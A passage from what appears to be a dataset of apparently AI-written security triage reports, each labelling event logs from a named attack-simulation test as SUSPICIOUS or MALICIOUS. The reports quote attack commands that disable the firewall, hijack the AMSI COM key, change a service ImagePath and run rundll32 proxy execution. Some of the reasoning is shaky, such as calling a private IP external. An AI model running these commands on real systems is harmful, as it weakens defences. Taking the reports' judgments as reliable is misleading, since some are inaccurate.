- The activity related to network share manipulation (using `net` commands) and event log manipulation `wevtutil.exe` are concerning. These events can be associated with lateral movement and log tampering by adversaries.
- The instance of Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) running as a system process is expected behavior for patch management and is generally benign.

### Conclusion
**Resolution: SUSPICIOUS**

While many of these logged actions could be part of regular system or administrative activities, the combination of network resource manipulation, repeated checks of user context, and potential involvement with event logs suggests this activity needs further investigation:
1. Verify legitimate administrative or authorized user actions that might explain these logs.
2. Review user accounts involved for irregular activity or any signs of compromise.
3. Implement enhanced monitoring to detect if similar activities repeat unfavorably or escalate in nature.
4. Engage users confirming their actions, especially those involving network share commands and log interactions. 

These steps should help differentiate between permitted and malicious activities, thereby protecting the system against potential threats. Further analysis may also necessitate reviewing network flows and additional system contexts around the log times."
Create Windows Hidden File with Attrib,"Upon analyzing the provided Sysmon and Application logs, the following observations and assessments have been made:

### Suspicious or Anomalous Behavior:
1. **Frequent Command-Line Processes**: There is a noticeable frequency in the execution of command-line processes (cmd.exe) with accompanying child processes (conhost.exe), initiated by the user SERVER002\admin_test. These processes include operations like:
   - Checking for and writing to `%temp%\data.001.txt`.
   - Using commands such as `attrib.exe` to alter file attributes, which could be indicative of attempts to manipulate or hide files.

2. **High Integrity Level**: Operations are performed at a high integrity level, indicating administrative privileges. While this is not inherently malicious, it becomes suspicious when combined with frequent command execution that attempts to manipulate file attributes or run system commands.

3. **Use of `wevtutil.exe`**: Processes like `wevtutil.exe`, which is generally used for managing Windows Event Logs, are frequently executed. While legitimate uses exist, its misuse can indicate attempts to manipulate or clear event logs, often seen in post-exploitation activities.

4. **Multiple Instances of `MicrosoftEdgeUpdate.exe`**: Numerous instances of `MicrosoftEdgeUpdate.exe` running with SYSTEM privileges are documented. While these can be related to legitimate update processes, the sheer number aligns with behaviors seen in exploitation or unauthorized usage attempting to maintain persistence or inject updates.

### Assessment of Malicious Activity:
- The logs show patterns of behavior that could be indicative of attempts at file manipulation or hiding, credential reconnaissance (through `hostname.exe` and `whoami.exe`), and potential log alteration or evasion activities using `wevtutil.exe`.
- The use of administrative privileges (High integrity level) for executing a series of commands in quick succession is often associated with unauthorized access or script automation which is not a standard routine for legitimate administrative tasks.
- The extensive activity related to `MicrosoftEdgeUpdate.exe`, especially when SYSTEM authority is involved, raises flags for potentially malicious or compromised update services.

### Conclusion:
The activities captured in the logs display characteristics of behavior that should be considered suspicious. They warrant further investigation to rule out or confirm malicious intent. Tests should include validating the authenticity of system task sequences, verifying the source and integrity of the executed processes, and ensuring the security of user credentials and services involved.

**Resolution**: **SUSPICIOUS**

### Guidance on Proceeding:
- Conduct a deeper forensic analysis on the host to capture script logs, temporary files involved, and file system changes around the event times.
- Monitor user activity for SERVER002\admin_test to validate if actions align with expected user behavior.
- Analyze network logs for any unusual communications particularly from external IPs attempting to orchestrate these sequences.
- Consider implementing stricter role-based access controls and policy restrictions on script executions and event log manipulations.
- Review and verify the legitimacy of updates and processes, especially Microsoft Edge updates, involved at SYSTEM integrity level to secure against exploitations.
- Continuously monitor for further anomalous processes execution and audit logs for unsuccessful attempts to modify logs or hide traces."
Blackbit - Disable Windows Firewall using netsh firewall,"After carefully analyzing the provided Windows event logs from the host ""Server002,"" the following findings and assessments are noted:

### Key Observations:
1. **Process Execution:**
   - Frequent execution of common system utilities such as `whoami.exe`, `hostname.exe`, and `cmd.exe` is observed. This execution includes attempts to run the `netsh` command to disable the firewall (`netsh firewall set opmode mode=disable`). This command is concerning as it attempts to alter system security settings, typically requiring administrative privileges.

2. **Event Indicates Use of High Integrity Level:**
   - The user ""SERVER002\\admin_test"" runs processes with a high integrity level, which suggests these processes have permissions typically reserved for administrative tasks.

3. **Multiple `wevtutil.exe` Executions:**
   - The event logs show multiple executions of `wevtutil.exe`, which is a command-line utility that is used for managing the Event logs. Although this might be expected in some monitoring scenarios, it's unusual if performed repeatedly and without clear documentation or necessity from an administrative workflow perspective.

4. **Security Log Events:**
   - Event ID 4624 indicates a successful logon with Logon Type 5, which is typically used for service logons, and is consistent with system processes starting.
   - Event ID 4672 shows that the `SYSTEM` user was assigned a broad range of privileges including SeDebugPrivilege, which is a highly privileged token.
  
### Assessment:
- The use of commands to disable the firewall via `netsh` is particularly concerning as it allows unauthorized network access and poses a significant security threat. This behavior suggests an attempt at privilege escalation or manipulation of security settings.
  
- `wevtutil.exe` executions for copying or exporting logs without clear purpose are considered suspicious as they might signify an attempt to cover tracks or exfiltrate logs.

- While the execution of `whoami.exe` and `hostname.exe` can be benign in themselves if used to gather information quickly, their combination with an attempt to disable the firewall raises the suspicion scale considerably.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that warrant further investigation. The execution of commands to potentially disable the firewall, along with `wevtutil.exe` executions, could indicate malicious intent or unauthorized administrative actions. These do not inherently confirm malicious activity, but they represent indicators that are not typical of standard administrative tasks without further contextual justification.

### Recommended Actions:
1. **Immediate Incident Response:**
   - Review user access logs and firewall configurations to determine any unauthorized changes.
   - Ensure that firewall settings are re-enabled and configured to block unauthorized access.

2. **Further Investigation:**
   - Analyze additional logs or data sources, such as network logs or user activity logs, to gather more context around the suspicious activities.
   - Conduct a thorough check on the integrity and configuration of services on `Server002` to identify any unauthorized alterations or configurations.

3. **Implement Preventive Measures:**
   - Review and strengthen access policies, particularly around administrative privileges and command execution on sensitive systems.
   - Educate users on recognizing and properly responding to potential security incidents, and establish a clear procedure for reporting suspicious activities.

By taking these actions, potential threats can be mitigated, and the current situation can be further clarified to determine any necessary additional steps."
Activate Windows NoFind Group Policy Feature,"Upon analyzing the provided Windows event logs, I've noted several activities and patterns that are indicative of potential issues, but not enough to remain conclusive without additional context or investigation. Here is a detailed breakdown:

1. **Repeated Execution of System Processes with Admin User:**
   - Several instances of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, and `reg.exe` executed by `SERVER002\\admin_test`.
   - While these are legitimate sysadmin utilities, frequent spawning in quick succession could suggest automation or scripted activity, often seen in administrative scripts or unauthorized access scenarios.

2. **Registry Modification:**
   - The command `cmd.exe /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v NoFind /t REG_DWORD /d 1 /f` suggests alteration of user policies, which could disable Windows search features.
   - Registry operations that modify system or user policies can indicate attempts to hinder functionality – often exploited by malicious activities to conceal other actions.

3. **Unusual Time Changes:**
   - There are events where the system time has been altered slightly backward, as seen in Event ID `4616` in the Security log. Time changes can affect logging and auditing and may be used to circumvent detection.

4. **System Processes Observed:**
   - Multiple legitimate system services such as `svchost.exe`, `TiWorker.exe`, and `MicrosoftEdgeUpdate.exe` are noted. Such services typically run in the background but must be scrutinized if they deviate from normal patterns.

5. **Absence of Direct Malicious Indicators:**
   - There are no direct indicators of malware, such as execution of known malicious binaries. However, it's crucial to focus on logs that indicate potential preparatory or covert actions.

**Assessment:**
- The repeated execution of sysadmin tools in rapid succession under an administrative context and the registry modification are **SUSPICIOUS** activities.
- The time change activity might be incidental or misconfigured but should not be disregarded without inquiry.

**Resolution:** SUSPICIOUS

**Guidance:** Further investigation is needed:
   - Verify whether these actions align with legitimate administrative operations.
   - Check for additional context outside these logs – such as network traffic, user activity reports, or alerts from other security tools.
   - Consider applying stricter auditing policies or employ real-time monitoring to gather additional evidence and context.

The investigation should focus on determining the intent behind these activities, assessing the full scope of potential unauthorized changes, and enhancing security measures to prevent potential exploitation or data manipulation."
InstallUtil HelpText method call,"Based on the analysis of the provided logs, the following observations have been made:

### Windows PowerShell Log Analysis:
1. **Execution of PowerShell Script**: There is evidence of a PowerShell script execution from a temporary folder (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`). This action itself is quite common, especially for scripts performing testing and installation operations.

2. **Use of InstallUtil**: The script uses `Add-Type` with custom type definitions that include a potential installer class (`InstallUtilfileTest`) indicating that it is designed to be executed through InstallUtil, a legitimate Microsoft .NET Framework tool that can be misused by attackers for executing malicious code.

3. **Construction of Dynamic Assemblies**: The script compiles and loads a .NET assembly from source code, which writes some test text to a file (`tmpA195.tmp`). This involves creating an actual assembly in TEMP folder and invoking it, which is not usual for standard administrative scripts unless it is for testing or development purposes.

4. **Command and Execution Test Failure**: The script attempts to test the execution of this assembly and compares its output to expected values. Failure to match the expected result causes a controlled error. This action is typical of testing environments.

### Sysmon Log Analysis:
1. **Execution of .NET Compilers**: There is activity related to the .NET compilers (`csc.exe` and `cvtres.exe`), which aligns with compiling and building .NET executables from the script. Such activity can be typical during software development but could also be indicative of suspicious file creation if done without explicit requirement.

2. **InstallUtil Execution**: The logs show execution of `InstallUtil.exe` to load the compiled DLL, as per logs seen with process ID `5912`. Although the execution of `InstallUtil.exe` might be legitimate, its presence in suspicious contexts (like loading DLLs from non-standard paths) might be a red flag.

### Overall Assessment:
- The behavior involving PowerShell, compilation of .NET code, and use of `InstallUtil.exe` typically indicates either a developer testing environment or the presence of potentially suspicious activity.
- The location of the activities in temporary folders and absence of explicit documentation or context raises some concerns.
- Nevertheless, without additional context, such as user intention or expected environment history, determining if this is indeed malicious is challenging.

### Resolution:
**SUSPICIOUS**: 
The tools and actions outlined in the logs are known to be used both for legitimate administrative, testing, or development purposes and potentially in malicious contexts. While there are no definitive indicators of compromise (e.g., known malicious payloads or evidence of privilege escalation), the use of temporary directories, dynamic assembly creation, and InstallUtil may warrant further investigation to rule out malicious intent. Continuous monitoring of such patterns and user behavior, along with cross-referencing with threat intelligence databases for any associated IOCs, is advisable."
AMSI Bypass - Override AMSI via COM,"Based on the analysis of the provided Windows event logs, the following points highlight the observed activities and any indicators of anomalous or potentially malicious behavior:

1. **Registry Modification via Command Line**: 
   - There is a notable event involving `cmd.exe` execution followed by `reg.exe` to modify the registry. The command executed is:
     ```
     ""cmd.exe"" /c REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
     ```
   - This action modifies the registry to point to a non-existent DLL (`C:\IDontExist.dll`), which can be indicative of a persistence mechanism often used in malware to load malicious payloads. 

2. **Execution of Common Windows Utilities**:
   - Several benign Windows utilities (`whoami.exe`, `conhost.exe`, `svchost.exe`, `wevtutil.exe`) were executed. The pattern and context of these executions appear routine, except when tied to the registry modification event.

3. **Microsoft Edge Update Activity**:
   - A significant number of events relate to Microsoft Edge Update processes. These activities predominantly involve processes running under `NT AUTHORITY\SYSTEM`, which is common behavior for system updates. While large in number, no explicit malicious activity related to Edge update processes is evident from the logs.

4. **Time Synchronization Events**:
   - There are logs related to time changes and synchronization with `time.windows.com`. These are typical for maintaining consistent system time across networks and do not appear to have malicious intent.

Based on this analysis, the most critical finding is the registry modification by `cmd.exe` and `reg.exe`, suggestive of an attempt to establish persistence using a non-existent DLL. This behavior is often associated with suspicious or malicious intent, especially when making unauthorized configuration changes that could facilitate further exploitation.

### Resolution:
- **SUSPICIOUS**: The registry activity related to `cmd.exe` and `reg.exe` is abnormal and potentially indicative of malicious behavior. Further investigation is required to confirm whether this was an unauthorized action or part of legitimate administrative activity. Consider identifying the source of this command, validating user intent, and scanning for additional indicators of compromise.

### Recommendations:
- Investigate the user `SERVER002\admin_test` for any unauthorized activities.
- Review policies and controls on registry changes to ensure that such modifications are logged and controlled.
- Conduct a thorough malware scan on the system, paying particular attention to silent execution patterns.
- Implement stricter monitoring and alerting for registry changes and other anomalous behaviors."
Compile After Delivery using csc.exe,"Upon reviewing the provided Windows event logs, several points stand out that warrant attention. Here is a detailed analysis:

### Findings:

1. **Privilege Use (Event ID: 4672):**
   - Two entries indicate that the user `admin_test` was granted a set of special privileges, including `SeDebugPrivilege`, which can be used for activities such as process injection or altering system-level processes. This is a potential indicator of privilege escalation or preparatory steps for system tampering.

2. **Logon Events (Event ID: 4624):**
   - Logon Type 3 (network logon) was detected for the user `admin_test` from an external IP address (`192.168.0.102`), utilizing the NTLM authentication protocol. The logon from a different workstation (`DESKTOP-3HL5B2P`) via the network and with elevated privileges suggests potential lateral movement or external access.

3. **Process Execution (Sysmon Event ID: 1 and 5):**
   - **Suspicious Processes:**
     - Execution of `cmd.exe` for compiling a C# script (`calc.cs`) using `csc.exe`. This script is temporarily stored in paths like `C:\Windows\Temp\` and `AppData\Local\Temp\`, which might indicate the presence of a potentially malicious code meant to execute or drop a payload.
     - The use of PowerShell (`powershell.exe`) and tools like `wevtutil.exe` and `whoami.exe` were started. While not inherently malicious, in combination with other indicators, they could suggest post-exploitation enumeration.
   - The path for `csc.exe` and `cvtres.exe` suggests compilation activities possibly related to creating or running unapproved software on a system.

4. **Anomalous Access and Credential Use (Event ID: 5379):**
   - Multiple failed read operations for credential fetching related to `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:` tokens. The ReturnCode `3221226021` indicates a failed attempt for reading or using credentials, pointing towards unauthorized attempts or errors in credential accessing operations.

5. **Windows Update and Microsoft Edge (Event ID: 1 in Sysmon):**
   - Regular activities showing update operations for Windows Defender, which might appear benign but are worth noting in the context of an attack timeline to understand timing and potential abuse of these sessions.

### Assessment:

Based on the logs reviewed, there is strong evidence of activities that suggest the potential compromise of the system:

- The presence of unexpected compiler actions and processes, particularly in temporary directories, points to suspicious behavior with potential for malicious intent.
- The externally-initiated network logon session with elevated privileges, coupled with the privileges assigned to `admin_test`, are concerning.
- Failed credential fetching suggests unauthorized access attempts.

### Resolution:

**SUSPICIOUS -** The activities indicate suspicious behavior that requires further investigation. There is no definitive evidence of known malware, but the signs of potential malicious activity warrant further analysis.

### Guidance on Next Steps:

1. **Containment:**
   - Immediately restrict external access by disabling or isolating the affected account `admin_test` and reviewing all connected network devices.
   - Run an in-depth antivirus and anti-malware scan on `Server002`.

2. **Investigation:**
   - Analyze the contents of `calc.cs` for malicious scripts or payloads.
   - Review network traffic and logs for the source address `192.168.0.102` and workstation `DESKTOP-3HL5B2P`.
   - Verify recent installs, removals, and changes to the system's configurations during the period surrounding these events.

3. **Remediation:**
   - Change all administrative passwords and review user privilege assignments.
   - Ensure system updates and application security patches are current across the server."
Rundll32 with Ordinal Value,"Upon analyzing the provided Windows event logs, there are several observations and assessments regarding potential malicious activity or compromise:

1. **Security Log Insights:**
   - There are multiple logon events (Event ID 4624), with logon types 3 (network) and 5 (service). A service logon (4624 with logon type 5) is for normal operations in this context as it involves `C:\Windows\System32\services.exe`.
   - Privileged logon events (Event ID 4672) for the user `admin_test` include a list of high-privilege tokens like `SeDebugPrivilege`, which can be used for various sensitive actions in the system.
   - An Event ID 4799 shows potential modification of security privileges, which, if combined with suspicious activity, could indicate a privilege escalation attempt.

2. **Sysmon Log Insights:**
   - The execution of `cmd.exe` with a suspicious command line and rundll32 execution (`cmd.exe /c rundll32.exe...`). Use of `rundll32.exe` in this manner is often a technique used by malware to execute code via DLLs.
   - The process `AllTheThingsx64.dll` being executed via `rundll32.exe` raises a red flag. Unless this is a known and trusted application being used for legitimate purposes, this corresponds with a common technique used in attacks.
   - The frequent invocation and rapid consecutive launches of `wevtutil.exe`, `whoami.exe`, and `hostname.exe` in the Sysmon logs suggest possible reconnaissance activities, which are often indicative of malicious intent.
   - A series of installer executions related to Microsoft Edge updates appear benign in isolation, yet the context alongside suspicious cmd and rundll32 activities needs further examination.

3. **General Observations:**
   - The user `admin_test` frequently appears across different logs executing tasks that include high-privilege operations and potential reconnaissance, increasing suspicion around activities tied to this account.
   - Privilege usage and logon patterns, combined with process execution involving known administrative tools (`wevtutil`, `whoami`, etc.), could be part of a lateral movement or initial access strategy.

**Assessment and Resolution:**
- **Threat/Risks Identified:** There are clear indicators of potential reconnaissance and unauthorized execution patterns, notably involving `rundll32.exe` with suspicious DLL calls, which is a known technique in many attack vectors.
- **Guidance:** Further investigation is warranted to verify if `AllTheThingsx64.dll` and associated cmd executions are legitimate and if the `admin_test` account activities are authorized. A thorough check should include verifying the integrity and source of this DLL and any network activity or remote access patterns associated with the events.
  
Considering the observations with suspicious execution patterns and potential misuse of administrative privileges, the resolution of this analysis is:
- **Resolution:** MALICIOUS

Immediate action such as isolating the affected system, analyzing the authenticity of affected accounts, and a comprehensive security assessment to identify and mitigate potential threats should be taken."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"**Detailed Analysis of the Logs**

**Suspicious or Anomalous Behavior:**

1. **PowerShell Execution**: At ""2024-10-28 12:47:27.992"", the logs indicate that ""powershell.exe"" was executed by the user ""SERVER002\admin_test"". PowerShell is a legitimate tool often misused by attackers for malicious activities such as executing scripts or downloading additional payloads. The absence of command-line arguments in the logs makes it difficult to determine the intention behind PowerShell execution, but it's a potential indicator for further review.

2. **Conhost.exe and Wevtutil.exe Execution**: We see multiple executions of ""conhost.exe"" and ""wevtutil.exe"" immediately following the PowerShell execution. ""Wevtutil.exe"" is a command-line utility used to manage event logs and event tracing. The usage pattern here could indicate manipulation or clearing of event logs, a tactic that attackers use to cover their tracks. This behavior is somewhat unusual, especially if it cannot be correlated with any administrative tasks during that time.

3. **Cmd.exe and Plink.exe Execution**: A particularly concerning entry at ""2024-10-28 12:47:28.936"" shows ""cmd.exe"" executing ""plink.exe"" with the SSH protocol, connecting to an external host (file.local) with hardcoded credentials (""-l root -pw pass""). This strongly suggests an unauthorized backdoor or tunneling attempt which is a severe security concern.

**Indicators of Malicious Activity or Compromise:**

- **Usage of Plink with Root Credentials**: The execution of ""plink.exe"" with root-level credentials for SSH access raises a significant red flag. This specific activity suggests an attempt to establish a remote connection with potential administrative rights, indicative of an attempt to exfiltrate data or further compromise other systems.

- **Abnormal Wevtutil Activity**: Several events involving ""wevtutil.exe"" combined with other utility executions closely following each other suggest potential log clearing operations. This is common in evasion techniques post-exploitation.

- **PowerShell Execution Without Command Details**: The fact that powershell.exe was run without logged specifics adds to suspicious behavior though by itself might not constitute overt malicious activity.

**Assessment of the Situation:**

Given the analysis, the logs contain potential evidence of unauthorized and malicious activity, particularly marked by suspicious SSH communication attempts using hardcoded credentials, and possible log manipulation.

**Resolution**: **MALICIOUS**

**Threats or Risks Identified:**

- Possible unauthorized remote access using SSH with high-level credentials.
- Potential tampering or obfuscation of logs using tools like wevtutil.exe, linked closely with suspicious command-line utility executions.
- Abnormal PowerShell invocation that could be used for executing scripts or malicious payloads.

**Guidance on How to Proceed:**

1. **Immediate Containment**: 
   - Isolate the affected host (Server002) from the network to prevent further unauthorized access or data exfiltration.
   
2. **Credentials Audit**:
   - Review and possibly reset any credentials used on the machine observed in logs (root, SERVER002\admin_test).
   - Verify and audit any other systems potentially accessed using these credentials.

3. **In-depth Analysis**:
   - Conduct a full forensic analysis on the involved files, especially those from the user’s temp directory and any scripts that might have been executed via PowerShell.
   - Cross-reference other logs and security solutions to identify further compromise indicators.

4. **Remediation Steps**:
   - Remove any unauthorized software and backdoors.
   - Patch systems and evaluate security posture across systems, ensuring similar vulnerabilities are addressed to prevent reoccurrence.

5. **Security Policy Reinforcement**:
   - Educate users and ensure security policies are being followed, particularly around the use of powerful utilities like PowerShell, and handling credentials securely."
Service ImagePath Change with reg.exe,"**Analysis of the Logs:**

The given logs, particularly from the Sysmon logs, reveal several process executions and command-line activities. Key points of interest include:

1. **Multiple PowerShell Executions:**
   - There are no specific command lines provided in the PowerShell log, so no information is available regarding potential misuse of PowerShell.

2. **Process Execution of System Utilities:**
   - The Sysmon logs show several system utilities being executed by the user ""SERVER002\\admin_test"" such as `hostname.exe`, `whoami.exe`, and several instances of `conhost.exe`. 
   - While these utilities are legitimate and part of the operating system, their frequent invocation in a short timespan could be indicative of malicious activity if used as part of a script or attacker routine.
   - However, without specific command-line arguments or a context showing unauthorized access, these executions alone are not definitive indicators of compromise.

3. **Registry Modification:**
   - The most suspicious activity is the execution of `cmd.exe` with the command line that modifies the Windows registry to create a service `calcservice` with a specified ImagePath of `cmd.exe`. This can potentially allow the execution of a command prompt with elevated privileges as a service, which is a common persistence mechanism used by attackers.
   - **Command Executed:** 
     ```
     reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%windir%\system32\cmd.exe""
     ```
   - This registry activity is highly suspicious and is often associated with attempts to maintain persistence, privilege escalation, or conceal malicious operations.

4. **Use of `wevtutil.exe` and `conhost.exe`:**
   - `wevtutil.exe` and `conhost.exe` are often seen in normal operations; however, their usage immediately after PowerShell executions can be investigated to ensure they are not part of an attack sequence.
   - It might suggest potential log manipulation attempts if `wevtutil.exe` commands were issued to clear or alter event logs, though this is speculative without specific command parameters.

5. **Scheduled Task or Service Creation Suspense:**
   - The registry modification to create a service unnamed or innocuously named such as `calcservice` is a notable red flag. Such practices are used for hiding malicious scripts under non-descriptive service names.

**Assessment:**

Based on the analysis, the logs contain evidence of suspicious activities, particularly with the creation of a potentially malicious registry key for service creation that involves running a command prompt. These actions are suggestive of an attempt to establish persistence or execute unwanted actions with elevated privileges.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Monitoring and Containment:**
   - Review the Windows services to identify and possibly disable the `calcservice` or any other unauthorized services.
   - Monitor ongoing activities on the host for further suspicious behavior.

2. **Thorough Examination:**
   - Conduct a comprehensive review of other logs (e.g., PowerShell, Security) for command lines that may have been executed by PowerShell.
   - Analyze network connections and file modifications in correlation with these timestamps for signs of data exfiltration or lateral movement.
   - Check for any scheduled tasks created around the same time.

3. **Forensic Investigation:**
   - Initiate a forensic analysis of the involved processes and their parent events to understand the extent of the potential compromise.
   - Ensure the integrity and authenticity of system logs to confirm no log manipulation has been performed.
  
4. **Increase Security Posture:**
   - Implement alerting for activities that involve registry changes to critical hives like SYSTEM\Services.
   - Restrict direct execution of cmd.exe or PowerShell via service or task creation through Group Policy or similar mechanisms.

Ultimately, consulting with incident response teams and diving deeper into potential IOC (Indicators of Compromise) would be prudent to assess any need for remediation or isolation procedures."
Microsoft.Workflow.Compiler.exe Payload Execution,"After a comprehensive analysis of the provided Windows event logs, here are the key points and assessment:

### Observations:
1. **Frequent Process Executions**:
   - **MicrosoftEdgeUpdate.exe** and other related executables are being run multiple times. These processes are related to the update mechanism of Microsoft Edge, which operates under `NT AUTHORITY\SYSTEM` privileges. Frequent updates or checks for updates can be normal, but the density of these logs indicates potentially automated or scripted behavior.

2. **PowerShell Activity**:
   - A notable PowerShell execution: `powershell.exe & {C:\Windows\Microsoft.NET\Framework64\v4.0.30319\microsoft.workflow.compiler.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.xml"" output.txt}`. The use of PowerShell to call `microsoft.workflow.compiler.exe` with arguments involving a file in the temp directory is unusual unless this is part of a known automated task or application behavior, as it involves compilation of workflow definitions.

3. **Unusual Log Entries and Errors**:
   - The application log shows unhandled exceptions and errors linked to `microsoft.workflow.compiler.exe`, indicating possible script or automation failures (`System.IO.DirectoryNotFoundException`).

4. **Security Privileges**:
   - Event ID 4672 indicates special privileges assigned to `SYSTEM` accounts. While this is typical on Windows systems for service accounts, it is crucial to verify these privileges align with expected system behavior.

5. **Credentials Related Activities**:
   - Multiple events (5379) suggest several credential operations or accesses by `admin_test` fail with a `ReturnCode` of `3221225567`. These operations may suggest attempts to access resources that the user does not have permission for or incorrect credential configurations.

### Indicators and Risks:
- The intensive execution of EdgeUpdate processes and PowerShell scripts could suggest potential misuse or unintentional deployment failures.
- The presence of errors and exceptions in the application log indicates that the operating scripts or applications, particularly involving `microsoft.workflow.compiler.exe`, might not be sufficiently robust.
- Although no immediate malicious activity is apparent, there is potential for exploitation if script injections are involved, especially with frequent use of PowerShell.
  
### Recommendations:
- **Further Investigation**: Conduct deeper analysis into scripts or scheduled tasks invoking PowerShell and the exact purpose of `microsoft.workflow.compiler.exe`.
- **Review Scheduled Tasks and Scripts**: Check if there are Genuine tasks running and performing updates. Validate whether these executions align with IT policy.
- **User Account Review**: Audit permissions for the `admin_test` account to ensure they are appropriate for its intended role.
- **Monitor and Alert Setup**: Configure alerting for similar patterns to quickly detect potential misuse or misconfiguration.

### Conclusion:
The activity detailed in the logs should be labeled as **SUSPICIOUS** due to the frequent PowerShell executions and failed credential operations which indicate that something might not be entirely right, and further investigation is warranted to ensure that no malicious activity is occurring or that any misconfiguration does not lead to a potential security breach."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"Given the provided Windows event logs, I will analyze them for any indicators of malicious activity. The logs provided include entries from the Application, System, Sysmon, and Security logs.

### Analysis:

#### 1. **Windows PowerShell Log:**
   - **Details lacking:** No entries or events are provided from the Windows PowerShell log section, which means there is no data to analyze from Powershell activities.

#### 2. **Application Log:**
   - The application log contains entries from `edgeupdate` indicating the stopping of a service:
     - `""Service stopped""` at  `2024-10-24 17:43:57.7079472` and `2024-10-24 17:43:59.9576789`.
   - These logs seem to pertain to the update mechanism of Microsoft Edge, so this is typical and does not indicate suspicious activity by itself.

#### 3. **System Log:**
   - The entries show timezone and time adjustments using `svchost.exe`, which is common for system time synchronization. This finds the time source at `time.windows.com`.
   - There are no unusual executions or error messages indicating a direct compromise or suspicious activity.

#### 4. **Sysmon Log:**
   - Entries show multiple executions of system processes `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`. The user account seems to engage in activity related to event utilities, which could be legitimate administrative activity.
   - The command `""cmd.exe"" /c reg add ...` and related registry activity are evident:
     - Addition of a registry key related to `SecondaryAuthenticationFactor`, executed by `cmd.exe`, seems questionable and might indicate unauthorized changes.
   - Consistent executions of `MicrosoftEdgeUpdate.exe` processes, all running under `NT AUTHORITY\SYSTEM`, are present and generally benign, related to scheduled update tasks.

#### 5. **Security Log:**
   - There are events showing user logon actions and user privileges:
     - User `SERVER002\admin_test` was granted elevated privileges like `SeDebugPrivilege`, which could be misused to escalate privileges or bypass system protections.
     - Logon from a remote machine (`192.168.0.102`) suggests administrative remote access, but it's unclear if this was authorized.

### Assessment:

- **Suspicious Behavior:**
  - The registry modification meant to change settings around secondary authentication factors could be an early indicator of potentially unsafe configuration changes. 
  - Elevated privileges assigned to `admin_test`, along with administrative-level registry changes, warrant further review.

### Conclusion:

Based on the analysis, the provided logs contain some actions that should be scrutinized further to determine intent and legitimacy, particularly with the `cmd.exe` registry modification activity.

### Resolution:

**SUSPICIOUS -** The activity identified in the logs is likely to warrant further investigation, particularly around who executed the registry modification and why such permissions and operations were permitted. Further investigation should be conducted to validate the legitimacy of these actions, including verifying whether they were legitimate administrative tasks or unauthorized modifications."
Rundll32 execute payload by calling RouteTheCall,"Upon analyzing the provided Windows event logs, several entries stand out that may indicate suspicious or potentially malicious activity:

1. **PowerShell Activity**:
   - The PowerShell logs reveal the execution of `rundll32.exe` with `zipfldr.dll` to launch `calc.exe`. This method is often used as a ""living off the land"" binary tactic where native Windows binaries are used to avoid detection. While running `calc.exe` may seem benign, the method is unusual.
   - Event ID 600 from the PowerShell logs shows a specific command: `powershell.exe & {rundll32.exe zipfldr.dll,RouteTheCall ""'%windir%\\System32\\calc.exe'""}`. This is peculiar and could be indicative of command-line obfuscation or payload execution.

2. **Sysmon Events**:
   - Sysmon recorded similar activity where `powershell.exe` executed `rundll32.exe` with `calc.exe` as its target. This aligns with the PowerShell events and raises further suspicion.
   - Events indicate that `whoami.exe` and `conhost.exe` were executed, likely part of a script or larger command sequence to determine the user context, which can be suspicious in automated attacks.

3. **Security and System Logs**:
   - Time changes were recorded but frequent log data adjustments are typically harmless, especially aligned with security updates or sync actions.
   - Applications like `MicrosoftEdgeUpdate.exe` were active during this period, which is a legitimate process for browser updates, and likely unrelated to the PowerShell command activity.

**Assessment**:
The execution of `rundll32.exe` using `zipfldr.dll` to run `calc.exe` is not a typical method of launching legitimate applications and is a common evasion technique seen in various attack scenarios. The correlation between the PowerShell scripts and Sysmon logs supports the suspicion of this being utilized in potential malicious activity.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation is advised. This should include examining network logs for any unusual outbound connections, reviewing file system changes around the time the events occurred, and checking user activity logs.
- Conduct an endpoint analysis to verify the presence of any additional artifacts or scripting that may suggest a deeper compromise.
- Consider implementing increased monitoring and possibly isolating the host for further forensic analysis.
- Review network policies to ensure proper logging and monitoring practices to capture all future suspicious event activities."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"### Detailed Analysis:

**1. Sysmon Logs:**
- **Process Creation Event with CMD and Regedit:**
  - A `cmd.exe` process was executed with the command line arguments `reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`. This action changes the terminal server settings to allow multiple sessions for user accounts, which can be a red flag if not expected as it may bypass restrictions.
  - Parent process for this cmd execution was `wsmprovhost.exe`, often used in Windows Management tasks, linking it to remote management activities.
  
- **wevtutil.exe Usage:**
  - The usage of `wevtutil.exe` is observed multiple times (`EventID: 5`). This utility is standard for managing Windows Event Logs but could be suspicious if used to clear logs maliciously. However, no evidence of log clearing is present in the provided data.
  
- **Use of HOSTNAME.EXE and WHOAMI.EXE:**
  - The execution of `HOSTNAME.EXE` and `WHOAMI.EXE` processes seems benign in isolation as they are default Windows binaries used for gathering system information. The parent process `wsmprovhost.exe` suggests these might be parts of some remote query or management scripts.
  
**2. System Logs:**
- **Time Change:**
  - The `Kernel-General` event indicates a rollback of system time (Old Time: 2024-10-24 16:56:14.7117102 - New Time: 2024-10-24 16:56:11.1450737). Time changes can be indicative of malicious activities attempting to cover tracks or circumvent security mechanisms that rely on time-based logging.

**3. Security Logs:**
- **Privileged Logon Session:**
  - There is a logon event for `admin_test` with a privilege escalation (SeDebugPrivilege, etc.), which is permissible under certain administrative tasks but raises concerns if unexpected.

**4. Application Logs:**
- **No suspicious or relevant findings** to enrich the context of potential threats.

### Assessment:

Based on the analyzed logs, there are several indications of activity that requires further investigation, but not conclusive evidence of malicious activity:

